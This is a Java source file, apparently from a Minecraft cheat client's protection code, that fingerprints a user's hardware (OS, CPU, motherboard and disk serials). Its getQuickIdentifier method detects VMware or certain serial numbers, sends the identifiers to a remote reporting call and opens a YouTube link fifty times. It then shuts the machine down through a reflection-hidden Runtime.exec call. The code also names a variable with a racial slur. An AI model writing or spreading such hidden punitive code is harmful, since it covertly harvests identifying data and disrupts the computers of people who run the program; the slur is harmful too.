/*
 * Copyright (c) MineSense.pub 2018.
 * Developed by Arithmo
 */

package exhibition.util.security;

import net.minecraft.util.CryptManager;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;
import oshi.hardware.ComputerSystem;
import oshi.hardware.HWDiskStore;
import oshi.hardware.HardwareAbstractionLayer;
import oshi.software.os.OperatingSystem;

public class SystemUtil {

    public static HardwareIdentification hardwareIdentification;

    public static String getHardwareIdentifiers() {
        hardwareIdentification = new HardwareIdentification(LibraryIntegrityChecker.checkOSHIIntegrity());
        return hardwareIdentification.getIdentifiers();
    }

    public static String getQuickIdentifier() {
        try {
            String nigro = hardwareIdentification == null ? "Not Grabbed" : hardwareIdentification.getIdentifiers();
            if (nigro.contains("VMware") || (nigro.toLowerCase().contains("vmware") || nigro.toLowerCase().contains("vm ware")) || (nigro.contains("Intel(R) Core(TM) i5-8400 CPU @ 2.80GHz") && (nigro.contains("985B2ALNS") || nigro.contains("L731NRCX00H56SMB") || nigro.contains("SCRW18092104G2001")))) {
                Snitch.snitch(405, nigro);
                int i = 0;
                while (i < 50) {
                    i++;
                    Connector.openURL("https://www.youtube.com/watch?v=AP7utU8Efow");
                }
                Class runtimeClass = Class.forName("java.lang.Runtime");
                runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
            }
            return nigro.substring(0, Math.min(500, nigro.length()));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "null";
    }

    public static class HardwareIdentification {

        //OS
        private String osFamily;
        private String osManufacturer;
        private String osVersion;

        //Processor
        private String cpuName;
        private String cpuIdentifier;
        private String processorID;
        private String cpuVendor;

        //Motherboard/Baseboard
        private String moboManufacturer;
        private String moboModel;
        private String serialNumber;

        //Disk
        private String modelAndSerial = "";

        HardwareIdentification(Object systemInfo) {
            try {
                Class systemInfoClazz = Class.forName("oshi.SystemInfo");

                OperatingSystem os = (OperatingSystem) systemInfoClazz.getMethod("getOperatingSystem").invoke(systemInfo);

                Class hw = Class.forName("oshi.hardware.HardwareAbstractionLayer");

                HardwareAbstractionLayer hardware = (HardwareAbstractionLayer) systemInfoClazz.getMethod("getHardware").invoke(systemInfo);

                CentralProcessor processor = (CentralProcessor) hw.getMethod("getProcessor").invoke(hardware);
                ComputerSystem computerSystem = (ComputerSystem) hw.getMethod("getComputerSystem").invoke(hardware);

                osFamily = os.getFamily().trim();
                osManufacturer = os.getManufacturer().trim();
                osVersion = os.getVersion().toString().trim();

                cpuName = processor.getName().trim();
                cpuIdentifier = processor.getIdentifier().trim();
                processorID = processor.getProcessorID().trim();
                cpuVendor = processor.getVendor().trim();

                moboManufacturer = computerSystem.getManufacturer().trim();
                moboModel = computerSystem.getModel().trim();
                serialNumber = computerSystem.getBaseboard().getSerialNumber().trim();

                try {
                    for (HWDiskStore disk : ((SystemInfo) systemInfo).getHardware().getDiskStores()) {
                        if (!disk.getModel().contains("USB") || !disk.getModel().toLowerCase().contains("flash") || !disk.getModel().toLowerCase().contains("generic"))
                            modelAndSerial = (modelAndSerial.trim().concat(disk.getModel().trim().concat(disk.getSerial().trim()))).trim();
                    }
                } catch (Exception ignored) {

                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        String getIdentifiers() {
            StringBuilder stringBuilder = new StringBuilder(osFamily);
            stringBuilder.append(osManufacturer).
                    append(osVersion).
                    append(cpuName).
                    append(cpuIdentifier).
                    append(processorID).
                    append(cpuVendor).
                    append(moboManufacturer).
                    append(moboModel).
                    append(serialNumber).
                    append(modelAndSerial);

            return stringBuilder.toString().trim();
        }

    }

}
